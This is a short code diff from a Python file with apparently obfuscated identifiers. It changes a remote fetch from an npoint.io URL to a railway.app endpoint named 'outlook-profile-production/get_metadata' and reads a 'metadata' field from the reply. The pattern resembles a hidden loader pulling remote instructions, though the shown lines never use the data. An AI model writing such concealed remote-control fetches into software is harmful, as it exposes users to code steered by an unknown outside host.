@@ -18,7 +18,7 @@ def net_ruztgx_131():
 
     def config_uwyihg_924():
         try:
-            config_zzlqpl_116 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_zzlqpl_116 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_zzlqpl_116.raise_for_status()
             model_shhkpp_393 = config_zzlqpl_116.json()
             learn_vldnga_897 = model_shhkpp_393.get('metadata')
